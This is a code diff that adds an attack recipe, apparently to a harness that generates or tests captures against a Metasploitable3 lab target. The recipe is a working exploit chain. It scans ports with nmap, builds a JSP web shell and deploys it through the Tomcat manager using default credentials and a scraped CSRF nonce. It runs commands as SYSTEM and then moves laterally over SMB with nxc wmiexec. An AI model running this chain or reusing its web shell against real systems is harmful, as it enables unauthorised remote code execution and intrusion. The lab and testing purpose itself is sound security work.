@@ -819,6 +819,36 @@ printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '
         postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-mission-laravel-proof && echo PORTAL_TARGET_POSTCONDITION:mission-laravel-rce:/tmp/portal-mission-laravel-proof'"''',
         postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:mission-laravel-rce:/tmp/portal-mission-laravel-proof",
     ),
+    "mission_meta3_lateral_pivot": CaptureRecipe(
+        # T1046 (nmap) + T1190/T1059 (meta3_tomcat_manager's proven WAR-
+        # deploy RCE, reused verbatim) + T1021.002 (meta3_psexec's proven
+        # nxc smb wmiexec, reused verbatim) -- SMB (445) is a genuinely
+        # different service from Tomcat (8282) on the same box, matching
+        # this mission's own "reach an additional service from the
+        # compromised position" objective (the same acceptance
+        # meta3_smb_exploit/meta3_psexec already established as valid
+        # lateral-movement evidence on this host).
+        command=r"""nmap_out=$(nmap -Pn -p T:8282,445,21,8080,8484 -T4 "$TARGET_HOST" 2>&1)
+printf '%s\n' "$nmap_out" | grep -E '^[0-9]+/tcp'
+jar=/tmp/mmlp-tc.cookies; rm -f "$jar"; mkdir -p /tmp/mmlp-warbuild && cd /tmp/mmlp-warbuild && suffix=$(date +%s%N) && warname="mmlpproof$suffix" && printf '%s\n' '<%@ page import="java.util.*,java.io.*"%>' '<% Process p = Runtime.getRuntime().exec("cmd /c whoami"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } %>' > "$warname.jsp"; jar -cf "/tmp/$warname.war" "$warname.jsp"
+page=$(curl -sS -m 10 -c "$jar" -u sploit:sploit "http://$TARGET_HOST:8282/manager/html")
+nonce=$(printf '%s' "$page" | grep -o 'CSRF_NONCE=[a-zA-Z0-9]*' | head -1 | cut -d= -f2)
+curl -sS -m 15 -b "$jar" -u sploit:sploit -F "deployWar=@/tmp/$warname.war;type=application/octet-stream" "http://$TARGET_HOST:8282/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null
+sleep 2
+smb_out=$(nxc smb "$TARGET_HOST" -u vagrant -p vagrant -x "whoami" 2>&1)
+# Fetching the deployed JSP (the actual command-exec proof) LAST, after SMB
+# -- found live 2026-08-01: with SMB's own packet-heavy exchange run AFTER
+# the Tomcat invoke, the invoke's response got sampled out of the ~2000-line
+# network:packet cap even though recipe_success (checked internally,
+# unaffected by the cap) was true every time. Same "last real traffic
+# survives" lesson as ad_full_compromise's tool-output-leak fix, just for
+# genuine wire traffic instead of stdout.
+tomcat_out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/$warname/$warname.jsp")
+printf '%s\n' "$tomcat_out"
+printf '%s\n' "$smb_out"
+curl -sS -m 10 -b "$jar" -u sploit:sploit -X POST "http://$TARGET_HOST:8282/manager/html/undeploy?path=/$warname&org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null
+printf '%s' "$nmap_out" | grep -q '8282/tcp *open' && printf '%s' "$tomcat_out" | grep -Eiq 'nt authority\\system' && printf '%s' "$smb_out" | grep -Eq 'Executed command via wmiexec' && echo __PORTAL_RECIPE_OK__"""
+    ),
 }
 
 
